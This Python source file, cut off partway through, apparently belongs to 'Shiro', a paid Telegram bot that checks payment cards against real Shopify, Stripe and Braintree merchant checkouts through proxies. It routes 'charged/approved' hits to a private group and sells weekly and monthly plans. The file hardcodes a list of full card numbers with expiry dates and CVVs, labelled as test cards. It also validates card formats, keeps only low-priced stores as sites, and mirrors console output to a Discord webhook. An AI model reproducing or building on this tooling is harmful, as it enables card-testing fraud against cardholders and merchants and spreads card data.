# Shiro Telegram Bot - Shopify checker using gg.py
# Commands: /sh, /msh, /ac, /setsite, /setproxies
# Bot name: Shiro
# Sites and proxies persisted in MongoDB

import asyncio
import html as _html
import io
import json as _json_mod
import random
import re as _re
import requests
import secrets
import sys
import os
import time
import threading
import traceback
import signal
import functools
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone, timedelta

import httpx

from shopifyapi import (
    format_proxy, load_proxy_list, check_site_fast,
    run_shopify_check,
)
from stripeapi import (
    try_checkout_card, fetch_checkout_info,
)
try:
    from braintreeapi import run_braintree_check_sync as _bt_check_sync, check_bt_site_fast as _bt_site_fast
    _HAS_BT = True
except ImportError:
    _HAS_BT = False
    def _bt_check_sync(*a, **kw): return {"status": "Error", "message": "braintreeapi not installed"}
    def _bt_site_fast(*a, **kw): return (False, "braintreeapi not installed")

try:
    from stripecharge import check_stripe_gate as _st_check_sync, format_stripe_ui as _st_format_ui
    _HAS_ST = True
except ImportError:
    _HAS_ST = False
    def _st_check_sync(*a, **kw): return {"status": "Error", "message": "stripecharge not installed", "is_approved": False}
    def _st_format_ui(*a, **kw): return "stripecharge not installed"

# Ensure gg can be imported
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ── Shared asyncio event loop (runs in a daemon thread) ─────────────────────
# Use uvloop on Linux for 2-4x faster async I/O (not available on Windows)
try:
    import uvloop
    _shared_loop = uvloop.new_event_loop()
    _uvloop_loaded = True
except ImportError:
    _shared_loop = asyncio.new_event_loop()
    _uvloop_loaded = False

def _start_shared_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

_loop_thread = threading.Thread(target=_start_shared_loop, args=(_shared_loop,), daemon=True)
_loop_thread.start()

# Load .env so SHIRO_MONGO_URI, BOT_TOKEN, DEBUG can be set there
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

DEBUG = os.environ.get("DEBUG", "true").lower() in ("1", "true", "yes")

# ── Clean, Professional Debug Logger ────────────────────────────────────────
class ShiroLogger:
    """Clean, compact, professional logging system"""
    
    COLORS = {
        'RESET': '\033[0m',
        'GREEN': '\033[92m',
        'YELLOW': '\033[93m',
        'RED': '\033[91m',
        'BLUE': '\033[94m',
        'CYAN': '\033[96m',
        'GRAY': '\033[90m',
    }
    
    def __init__(self, debug=False):
        self.debug_enabled = debug
    
    def _timestamp(self):
        return datetime.now().strftime('%H:%M:%S')
    
    def _format(self, level, category, message, color='RESET'):
        """Format: [HH:MM:SS] [LEVEL] Category: Message"""
        ts = self._timestamp()
        if sys.stdout.isatty():
            return f"{self.COLORS['GRAY']}[{ts}]{self.COLORS['RESET']} {self.COLORS[color]}[{level}]{self.COLORS['RESET']} {category}: {message}"
        return f"[{ts}] [{level}] {category}: {message}"
    
    def success(self, category, message):
        """✅ Success messages"""
        print(self._format('✓', category, message, 'GREEN'))
    
    def info(self, category, message):
        """ℹ️ Info messages"""
        print(self._format('i', category, message, 'BLUE'))
    
    def warning(self, category, message):
        """⚠️ Warning messages"""
        print(self._format('!', category, message, 'YELLOW'))
    
    def error(self, category, message):
        """❌ Error messages"""
        print(self._format('✗', category, message, 'RED'))
    
    def debug(self, category, message):
        """🔍 Debug messages (only if debug enabled)"""
        if self.debug_enabled:
            print(self._format('D', category, message, 'CYAN'))
    
    def cmd(self, user, user_id, command):
        """Command execution log"""
        print(self._format('CMD', f'@{user} ({user_id})', command, 'BLUE'))
    
    def check(self, card_last4, status, message):
        """Card check result"""
        color = 'GREEN' if status in ['Charged', 'Approved'] else 'RED' if status == 'Declined' else 'YELLOW'
        print(self._format('CHK', f'****{card_last4}', f'{status}: {message[:50]}', color))

log = ShiroLogger(debug=DEBUG)

# ── Card Validation Utilities ───────────────────────────────────────────────
def _luhn_check(card_number):
    """Validate card number using Luhn algorithm. Returns True if valid."""
    digits = [int(d) for d in str(card_number) if d.isdigit()]
    if len(digits) < 13 or len(digits) > 19:
        return False
    digits.reverse()
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def _validate_card_format(card_str):
    """Validate card format and Luhn. Returns (valid, error_msg)."""
    parts = card_str.split("|")
    if len(parts) != 4:
        return False, "Invalid format (need: number|mm|yy|cvv)"
    num, mm, yy, cvv = parts
    if not num.isdigit() or len(num) < 13 or len(num) > 19:
        return False, "Invalid card number length"
    if not _luhn_check(num):
        return False, "Invalid card number (Luhn check failed)"
    if not mm.isdigit() or not (1 <= int(mm) <= 12):
        return False, "Invalid expiry month"
    if not yy.isdigit() or len(yy) not in (2, 4):
        return False, "Invalid expiry year"
    if not cvv.isdigit() or len(cvv) not in (3, 4):
        return False, "Invalid CVV"
    now = datetime.now(timezone.utc)
    exp_year = int(yy) if len(yy) == 4 else 2000 + int(yy)
    exp_month = int(mm)
    if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
        return False, "Card expired"
    return True, None

import telebot
from telebot import types
try:
    from telebot.handler_backends import CancelUpdate
except ImportError:
    CancelUpdate = None  # older pyTeleBot

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN not set. Add it to .env or environment variables.")
from telebot import apihelper
apihelper.ENABLE_MIDDLEWARE = True
# Use aiohttp as the HTTP backend for Telegram API calls (faster, connection-pooled)
try:
    from telebot import asyncio_helper
    apihelper.CUSTOM_REQUEST_SENDER = None  # let telebot use default but we configure below
except ImportError:
    pass
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=16)

# ── Global crash handler decorator ────────────────────────────────────────────
def _crash_safe(func):
    """Decorator: wraps handler so unhandled exceptions log + reply error instead of crashing the bot."""
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            # Log the full traceback
            log.error('Crash', f'Handler {func.__name__} crashed: {e}')
            traceback.print_exc()
            # Try to notify the user
            try:
                msg = args[0] if args else None
                if msg and hasattr(msg, 'chat'):
                    bot.reply_to(msg, "⚠️ An internal error occurred. Please try again.", parse_mode="HTML")
                elif msg and hasattr(msg, 'message'):  # callback_query
                    bot.answer_callback_query(msg.id, "⚠️ Internal error. Try again.", show_alert=True)
            except Exception:
                pass  # don't crash the crash handler
    return wrapper

# ── Bot-level exception handler ─────────────────────────────────────────────
class _BotExceptionHandler(telebot.ExceptionHandler):
    def handle(self, exception):
        log.error('Bot', f'{type(exception).__name__}: {exception}')
        traceback.print_exc()
        return True  # True = exception handled, don't re-raise

bot.exception_handler = _BotExceptionHandler()
# Owner-only commands (/resetdb, /cleardb). Set SHIRO_OWNER_ID to your Telegram user ID.
OWNER_ID = os.environ.get("SHIRO_OWNER_ID", "").strip()
if OWNER_ID:
    try:
        OWNER_ID = int(OWNER_ID)
    except ValueError:
        OWNER_ID = None
else:
    OWNER_ID = None

# ── Updating / Maintenance mode ─────────────────────────────────────────────
UPDATING_MODE = False

# Test cards used to validate sites when adding (only working sites are saved)
# If a site declines the CC, the site's payment gateway is working = site is valid
TEST_CCS = [
    "4977830296899843|09|25|247",
    "4100390678760485|12|26|341",
    "5178058429781365|07|26|531",
    "4232233008460817|04|28|133",
    "5187257684936826|02|29|966",
    "4190027442125360|10|28|498",
    "4147202476179591|01|26|222",
    "4147098448993188|09|27|247",
    "5187252186350196|08|27|977",
    "5374100180159134|11|25|281",
    "5178059476681391|07|28|323",
    "5178058238739612|03|27|909",
    "5156769073970080|07|27|992",
    "4640182056028222|12|27|312",
    "4364340008085419|09|28|273",
    "4744760311371605|01|29|927",
    "5156769606217975|11|26|675",
    "5414495060193985|01|27|909",
    "4147098493441505|03|27|521",
    "5153076655834871|01|26|591",
    "5143773304682940|04|27|229",
    "4034462052956418|04|32|548",
    "5424181504665899|12|26|693",
    "4428682000094384|01|27|320",
    "4373070030372456|02|27|443",
    "4364340004504223|01|28|387",
    "5143773632465703|12|26|408",
    "4031630111600226|03|29|417",
]
TEST_CC = TEST_CCS[0]  # backwards compat
# Only add sites whose first product price is at or below this (avoid expensive stores)

# Auto-join channel/group settings
AUTO_JOIN_CHANNEL = os.environ.get("AUTO_JOIN_CHANNEL", "").strip()  # e.g., @yourchannel or -1001234567890
AUTO_JOIN_GROUP = os.environ.get("AUTO_JOIN_GROUP", "").strip()  # e.g., @yourgroup or -1001234567890
MAX_SITE_PRICE = float(os.environ.get("MAX_SITE_PRICE", "40.0"))
MIN_SITE_PRICE = float(os.environ.get("MIN_SITE_PRICE", "10.0"))

# Discord webhooks (set in .env to override)
# Console = full live console logs ONLY. Hits go to Telegram private group.
DISCORD_WEBHOOK_CONSOLE = os.environ.get("DISCORD_WEBHOOK_CONSOLE", "").strip()
DISCORD_WEBHOOK_HITS = os.environ.get("DISCORD_WEBHOOK_HITS", "").strip()  # legacy, kept for backwards compat

# Telegram private group for hits (proxies set + charged/approved CC)
# Add the bot to a private group, then set the group chat ID here (e.g., -1001234567890)
SHIRO_HITS_CHAT = os.environ.get("SHIRO_HITS_CHAT", "").strip()

# ── Persistent aiohttp session for Discord webhooks (declare before use) ────
_aio_session = None
_aio_session_lock = threading.Lock()

# ── Live Console Mirror to Discord ──────────────────────────────────────────
# Intercepts ALL print() / stdout / stderr output and sends it to the Discord
# console webhook in real-time, batching lines every 2 seconds to avoid rate-limits.
class _DiscordConsoleMirror:
    """Wraps sys.stdout/stderr to buffer lines and flush them to Discord periodically."""
    _FLUSH_INTERVAL = 2.0   # seconds between Discord posts
    _MAX_CONTENT = 1900     # Discord message limit (leave room for formatting)

    def __init__(self, original, webhook_url):
        self._original = original
        self._webhook = webhook_url
        self._buffer = []
        self._lock = threading.Lock()
        self._timer = None
        self._started = False

    # — file-like interface so it can replace sys.stdout —
    def write(self, text):
        if self._original:
            self._original.write(text)
        if not text:
            return
        with self._lock:
            self._buffer.append(text)
            if not self._started:
                self._started = True
                self._schedule_flush()

    def flush(self):
        if self._original:
            self._original.flush()

    def isatty(self):
        return False

    @property
    def encoding(self):
        return getattr(self._original, "encoding", "utf-8")

    def fileno(self):
        if self._original:
            return self._original.fileno()
        raise OSError("no underlying fileno")

    # — batched Discord posting —
    def _schedule_flush(self):
        self._timer = threading.Timer(self._FLUSH_INTERVAL, self._flush_to_discord)
        self._timer.daemon = True
        self._timer.start()

    def _flush_to_discord(self):
        with self._lock:
            if not self._buffer:
                self._schedule_flush()
                return
            chunk = "".join(self._buffer)
            self._buffer.clear()
        # Split into <=1900-char blocks
        lines = chunk.rstrip("\n")
        if not lines:
            self._schedule_flush()
            return
        blocks = []
        current = ""
        for line in lines.split("\n"):
            candidate = (current + "\n" + line) if current else line
            if len(candidate) > self._MAX_CONTENT:
                if current:
                    blocks.append(current)
                current = line[:self._MAX_CONTENT]
            else:
                current = candidate
        if current:
            blocks.append(current)
        for block in blocks:
            self._post(f"```\n{block}\n```")
        self._schedule_flush()

    def _post(self, content):
        """Post to Discord — uses aiohttp if available, falls back to httpx."""
        try:
            if _aio_session is not None and not _aio_session.closed:
                _aio_post_sync(self._webhook, {"content": content})
            else:
                httpx.post(self._webhook, json={"content": content}, timeout=3.0)
        except Exception:
            pass  # never crash the bot for a webhook failure


if DISCORD_WEBHOOK_CONSOLE:
    _stdout_mirror = _DiscordConsoleMirror(sys.stdout, DISCORD_WEBHOOK_CONSOLE)
    _stderr_mirror = _DiscordConsoleMirror(sys.stderr, DISCORD_WEBHOOK_CONSOLE)
    sys.stdout = _stdout_mirror
    sys.stderr = _stderr_mirror

# MongoDB – from .env or SHIRO_MONGO_URI env var
MONGO_URI = os.environ.get("SHIRO_MONGO_URI")
if not MONGO_URI:
    log.warning('Config', 'SHIRO_MONGO_URI not set - MongoDB features disabled')

MONGO_DB_NAME = "shiro"
MONGO_COLLECTION = "chats"
MONGO_USERS_COLLECTION = "users"

INITIAL_CREDITS = 100
CREDITS_PER_CHECK = 1
MASS_MAX_CARDS = 200

# ── Plan definitions ─────────────────────────────────────────────────────────
PLANS = {
    "basic": {"name": "Basic", "price": "$5/week", "days": 7, "credits": -1},    # -1 = unlimited
    "pro":   {"name": "Pro",   "price": "$15/month", "days": 30, "credits": -1},
}

# Pre-compiled duration pattern: 1d, 2h, 30m, 1w or combos like 1d12h
_RE_DURATION = _re.compile(r'(\d+)\s*([wdhm])', _re.I)

def _parse_duration(text):
    """Parse duration string like '1d', '2h30m', '1w', '7d12h' into total minutes. Returns 0 on failure."""
    matches = _RE_DURATION.findall(text)
    if not matches:
        return 0
    total_min = 0
    for val, unit in matches:
        v = int(val)
        u = unit.lower()
        if u == 'w':
            total_min += v * 7 * 24 * 60
        elif u == 'd':
            total_min += v * 24 * 60
        elif u == 'h':
            total_min += v * 60
        elif u == 'm':
            total_min += v
    return total_min

_mongo_client = None
_mongo_db = None
_mongo_coll = None
_mongo_users_coll = None

_mongo_init_lock = threading.Lock()

def _get_mongo():
    """Lazy init MongoDB connection. Returns (db, collection) or (None, None) on failure."""
    global _mongo_client, _mongo_db, _mongo_coll, _mongo_users_coll
    if _mongo_coll is not None:
        return _mongo_db, _mongo_coll
    
    with _mongo_init_lock:
        # Double-check after acquiring lock
        if _mongo_coll is not None:
            return _mongo_db, _mongo_coll
        
        # Check if MONGO_URI is set
        if not MONGO_URI:
            return None, None
        
        try:
            from pymongo import MongoClient
            _mongo_client = MongoClient(
                MONGO_URI,
                serverSelectionTimeoutMS=5000,
                maxPoolSize=20,
                minPoolSize=2,
                maxIdleTimeMS=60000,
                connectTimeoutMS=5000,
                socketTimeoutMS=10000,
                retryWrites=True,
                retryReads=True,
            )
            _mongo_client.admin.command("ping")
            _mongo_db = _mongo_client[MONGO_DB_NAME]
            _mongo_coll = _mongo_db[MONGO_COLLECTION]
            _mongo_users_coll = _mongo_db[MONGO_USERS_COLLECTION]
            return _mongo_db, _mongo_coll
        except Exception as e:
            if DEBUG:
                print(f"[Mongo] Connection failed: {e}")
            return None, None


def _users_coll():
    """Return cached users collection (avoids re-creating Collection wrapper)."""
    if _mongo_users_coll is not None:
        return _mongo_users_coll
    _get_mongo()  # ensure connection is initialised
    return _mongo_users_coll


_mongo_codes_coll = None

def _codes_coll():
    """Get credit codes collection (cached)."""
    global _mongo_codes_coll
    if _mongo_codes_coll is not None:
        return _mongo_codes_coll
    db, _ = _get_mongo()
    if db is None:
        return None
    _mongo_codes_coll = db["credit_codes"]
    return _mongo_codes_coll


def generate_credit_code(credits, max_uses=1):
    """Generate a unique credit code."""
    code = secrets.token_urlsafe(12).upper()[:12]
    codes_col = _codes_coll()
    if codes_col is None:
        return None
    
    codes_col.insert_one({
        "code": code,
        "credits": credits,
        "max_uses": max_uses,
        "used_count": 0,
        "used_by": [],
        "created_at": datetime.now(timezone.utc)
    })
    return code


def redeem_credit_code(user_id, code):
    """Redeem a credit code. Returns (success, message, credits). Atomic to prevent double-redeem."""
    codes_col = _codes_coll()
    if codes_col is None:
        return False, "Database error", 0

    users_col = _users_coll()
    if users_col is None:
        return False, "Database error", 0

    try:
        # Atomic: claim the code only if user hasn't used it and uses remain
        code_doc = codes_col.find_one_and_update(
            {
                "code": code.upper(),
                "used_by": {"$ne": user_id},
                "$expr": {"$lt": ["$used_count", "$max_uses"]},
            },
            {
                "$inc": {"used_count": 1},
                "$push": {"used_by": user_id},
            },
        )
        if not code_doc:
            # Determine why it failed for a helpful message
            existing = codes_col.find_one({"code": code.upper()})
            if not existing:
                return False, "Invalid code", 0
            if user_id in existing.get("used_by", []):
                return False, "Code already redeemed", 0
            return False, "Code expired", 0

        credits = code_doc.get("credits", 0)
        code_type = code_doc.get("type", "credits")

        # Handle plan codes
        if code_type == "plan":
            plan_key = code_doc.get("plan", "basic")
            dur_min = code_doc.get("duration_minutes", 0)
            if not dur_min:
                # Backwards compat: old codes stored days
                dur_min = code_doc.get("days", 30) * 24 * 60
            if _set_user_plan(user_id, plan_key, minutes=dur_min):
                if DEBUG:
                    print(f"[Mongo] ✅ User {user_id} activated {plan_key} plan for {dur_min} minutes")
                return True, f"plan:{plan_key}:{dur_min}", 0
            else:
                # Roll back code claim
                codes_col.update_one(
                    {"code": code.upper()},
                    {"$inc": {"used_count": -1}, "$pull": {"used_by": user_id}},
                )
                return False, "Failed to activate plan", 0

     
